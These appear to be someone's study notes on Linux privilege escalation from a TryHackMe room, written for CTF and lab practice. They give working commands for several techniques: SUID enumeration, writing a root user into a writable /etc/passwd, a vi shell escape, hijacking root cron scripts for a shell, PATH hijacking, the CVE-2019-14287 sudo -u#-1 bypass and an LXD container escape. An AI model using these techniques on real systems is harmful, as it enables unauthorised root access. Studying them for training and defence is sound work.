Main Resources used : https://tryhackme.com/room/commonlinuxprivesc

Privilege Escalation usually involves going from a lower permission to a higher permission.

This is where you expand your reach over the compromised system by taking over a different user who is on the same privilege level as you. This is where you attempt to gain higher privileges or access, with an existing account that you have already compromised. For local privilege escalation attacks this might mean hijacking an account with administrator privileges or root privileges.

This allow you to do many things, including:

-   Reset passwords
-   Bypass access controls to compromise protected data
-   Edit software configurations
-   Enable persistence, so you can access the machine again later.
-   Change privilege of users

So the two main sources to get the information are these ones here -

LinEnum is a simple bash script that performs common commands related to privilege escalation, saving time and allowing more effort to be put toward getting root. It is important to understand what commands LinEnum executes, so that you are able to manually enumerate privesc vulnerabilities in a situation where you're unable to use LinEnum or other like script

[LinEnum.sh](http://LinEnum.sh)

[](https://netsec.ws/?p=309)[https://netsec.ws/?p=309](https://netsec.ws/?p=309)

[](https://github.com/rebootuser/LinEnum)[https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)

[](https://null-byte.wonderhowto.com/how-to/use-linenum-identify-potential-privilege-escalation-vectors-0197225/)[https://null-byte.wonderhowto.com/how-to/use-linenum-identify-potential-privilege-escalation-vectors-0197225/](https://null-byte.wonderhowto.com/how-to/use-linenum-identify-potential-privilege-escalation-vectors-0197225/)

[](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)[https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

If its running with high privelage with another account or something instead of root you have to do

```bash
sudo -u user binaryhecanrunasadmin exploitfrogtfo
```

### Set SUID/GUID Privellages →

This means that the file or files can be run with the permissions of the file(s) owner/group. In this case, as the super-user. We can leverage this to get a shell with these privileges!

As we all know in Linux everything is a file, including directories and devices which have permissions to allow or restrict three operations i.e. read/write/execute. So when you set permission for any file, you should be aware of the Linux users to whom you allow or restrict all three permissions.

Take a look at the following demonstration of how maximum privileges (rwx-rwx-rwx) look:

r = read

w = write

x = execute

**user** **group** **others**

rwx rwx rwx

421 421 421

The maximum number of bit that can be used to set permission for each user is 7, which is a combination of read (4) write (2) and execute (1) operation. For example, if you set permissions using **"chmod"** as **755**, then it will be: rwxr-xr-x.

But when special permission is given to each user it becomes SUID \*\*\*\*or SGID. When extra bit **“4”** is set to user(Owner) it becomes **SUID** (Set user ID) and when bit **“2”** is set to group it becomes **SGID** (Set Group ID).

Therefore, the permissions to look for when looking for SUID is:

SUID:

rws-rwx-rwx

GUID:

rwx-rws-rwx

```bash
**find / -perm -u=s -type f 2>/dev/null**
```

we can use the command: **"find / -perm -u=s -type f 2>/dev/null"** to search the file system for SUID/GUID files. Let's break down this command.

**find** - Initiates the "find" command

**/** - Searches the whole file system

**\-perm** - searches for files with specific permissions

**\-u=s** - Any of the permission bits _mode_ are set for the file. Symbolic modes are accepted in this form

**\-type f** - Only search for files

**2>/dev/null** - Suppresses errors

### Exploiting a Writeable /etc/passwd

The /etc/passwd file stores essential information, which is required during login. In other words, it stores user account information. The /etc/passwd is a plain text file. It contains a list of the system’s accounts, giving for each account some useful information like user ID, group ID, home directory, shell, and more.

The /etc/passwd file should have general read permission as many command utilities use it to map user IDs to user names. However, write access to the /etc/passwd must only limit for the superuser/root account. When it doesn't, or a user has erroneously been added to a write-allowed group. We have a vulnerability that can allow the creation of a root user that we can access.

The /etc/passwd file contains one entry per line for each user (user account) of the system. All fields are separated by a colon : symbol. Total of seven fields as follows.

Example : test:x:0:0:root:/root:/bin/bash

1.  **Username**: It is used when user logs in. It should be between 1 and 32 characters in length.
2.  **Password**: An x character indicates that encrypted password is stored in /etc/shadow file. Please note that you need to use the passwd command to computes the hash of a password typed at the CLI or to store/update the hash of the password in /etc/shadow file, in this case, the password hash is stored as an "x".
3.  **User ID (UID)**: Each user must be assigned a user ID (UID). UID 0 (zero) is reserved for root and UIDs 1-99 are reserved for other predefined accounts. Further UID 100-999 are reserved by system for administrative and system accounts/groups.
4.  **Group ID (GID)**: The primary group ID (stored in /etc/group file)
5.  **User ID Info**: The comment field. It allow you to add extra information about the users such as user’s full name, phone number etc. This field use by finger command.
6.  **Home directory**: The absolute path to the directory the user will be in when they log in. If this directory does not exists then users directory becomes /
7.  **Command/shell**: The absolute path of a command or shell (/bin/bash). Typically, this is a shell. Please note that it does not have to be a shell.

Now that we know this and we have a writable /etc/passwd file we can write a new line entry according to above formula and create a new user . We add the password hash of our choice and set the UID .GID and shell to roo. Allowing us to log in as our own root user.

Before we add our new user, we first need to create a compliant password hash to add! We do this by using the command:

```bash
 openssl passwd -1 -salt [salt] [password] 
```

And now we can edit the etc/passwd file and add either a new password to root or just include the a new user to the bottom like this

```bash
new:$1$1$uDhz6SV7D5d03OFB20h4E//G0:0:0:root:/root:/bin/bash
```

### Escaping Vi Editor

This exploit comes down to how effective our user account enumeration has been. Every time you have access to an account during a CTF scenario, you should use "sudo -l" to list what commands you're able to use as a super user on that account. Sometimes, like this, you'll find that you're able to run certain commands as a root user without the root password. This can enable you to escalate privileges.

If you find a misconfigured binary during your enumeration, or when you check what binaries a user account you have access to can access, a good place to look up how to exploit them is GTFOBins. GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions. It provides a really useful breakdown of how to exploit a misconfigured binary and is the first place you should look if you find one on a CTF or Pentest.

If we have something like /usr/bin/vi we can abuse it by using sudo vi and then we write :!sh and we will get a shell.

[](https://gtfobins.github.io/)[https://gtfobins.github.io/](https://gtfobins.github.io/)

### Exploiting Crontab

The Cron daemon is a long-running process that executes commands at specific dates and times. You can use this to schedule activities, either as one-time events or as recurring tasks. You can create a crontab file containing commands and instructions for the Cron daemon to execute.

We can use the command "cat /etc/crontab" to view what cron jobs are scheduled. This is something you should always check manually whenever you get a chance, especially if LinEnum, or a similar script, doesn't find anything.

Cronjobs exist in a certain format, being able to read that format is important if you want to exploit a cron job.

 \= ID, m = Minute ,h = Hour ,dom = Day of the month ,mon = Month ,dow = Day of the week ,user = What user the command will run as, command = What command should be run

If the auoscript is owned by root, meaning that it will run with root privileges, despite the fact that we can write to this file. The task th is to create a command that will return a shell and paste it in this file the autoscript file .Then we use nc -lvp 8888 for us to get a shell whenever the thing runs.

### Exploiting Path variable

PATH is an environmental variable in Linux and Unix-like operating systems which specifies directories that hold executable programs. When the user run any command in the terminal, it searches for executable files with the help of the PATH Variable in response to commands executed by a user.

Let's say we have an SUID binary. Running it, we can see that it’s calling the system shell to do a basic process like list processes with "ps". Unlike in our previous SUID example, in this situation we can't exploit it by supplying an argument for command injection, so what can we do to try and exploit this?

We can re-write the PATH variable to a location of our choosing! So when the SUID binary calls the system shell to run an executable, it runs one that we've written instead!

As with any SUID file, it will run this command with the same privileges as the owner of the SUID file! If this is root, using this method we can run whatever commands we like as root!

let's change directory to "tmp" Now we're inside tmp, let's create an imitation executable. The format for what we want to do is:

echo \["/bin/bash"\] > \[filewewannaimpersonate\]

we then make this file executable and then we change the path variable to this

export PATH=/tmp:$PATH

### Sudo Bypass

CVE-2019-14287 is a vulnerability found in the Unix Sudo program by a researcher working for Apple: Joe Vennix. Coincidentally, he also found the vulnerability that we'll be covering in the next room of this series. This exploit has since been fixed, but may still be present in older versions of Sudo (versions < 1.8.28), so it's well worth keeping an eye out for!

The vulnerability we're interested in for this task occurs in a very particular scenario. Say you have a user who you want to grant extra permissions to. You want to let this user execute a program as if they were any other user, but you don't want to let them execute it as root. You might add this line to the sudoers file:

```bash
<user> ALL=(ALL:!root) NOPASSWD: ALL 
```

This would let your user execute any command as another user, but would (theoretically) prevent them from executing the command as the superuser/admin/root. In other words, you can pretend to be any user, except from the admin.

In practice, with vulnerable versions of Sudo you can get around this restriction to execute the programs as root anyway, which is obviously great for privilege escalation!

With the above configuration, using sudo -u#0 <command> (the UID of root is always 0) would not work, as we're not allowed to execute commands as root. If we try to execute commands as user 0 we will be given an error. Enter CVE-2019-14287.

Joe Vennix found that if you specify a UID of -1 (or its unsigned equivalent: 4294967295), Sudo would incorrectly read this as being 0 (i.e. root). This means that by specifying a UID of -1 or 4294967295, you can execute a command as root, despite being explicitly prevented from doing so. It is worth nothing that this will only work if you've been granted non-root sudo permissions for the command, as in the configuration above.

Practically, the application of this is as follows:

```bash
 sudo -u#-1 <command>
```

If you have this (ALL : ALL) NOPASSWD: ALL just do sudo su to gain root and gg

### Netstat -tulpn

Do this to check what port is running local and try to connect to it using telnet.

[](https://www.hackingarticles.in/penetration-testing-on-memcached-server/)[https://www.hackingarticles.in/penetration-testing-on-memcached-server/](https://www.hackingarticles.in/penetration-testing-on-memcached-server/)

### Linking to a Folder gettinng chmod'ed

Here sometimes there is a cron job that could be something like this

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e1dd9514-5c93-41ab-aab8-cd27e33b6682/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e1dd9514-5c93-41ab-aab8-cd27e33b6682/Untitled.png)

So to exploit this if we have writable permission to the directory we can make a link to the root folder like so :

```bash
ln -s /root ./tmp
```

### LXD Exploitation :

On the Attacker Machine :

```bash
git clone  <https://github.com/saghul/lxd-alpine-builder.git>
cd lxd-alpine-builder
./build-alpine
```

then transfer the build file over to the Target machine you can use nc, python3 -m http.server or python -m SimpleHttpServer for this.

Then traverse to the folder where you downloaded this alpine image,

```bash
lxc image import ./alpine-v3.10-x86_64-20191008_1227.tar.gz --alias myimage
```

You are importing the image now as the myimage.

```bash
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
id
mnt/root/root
ls
```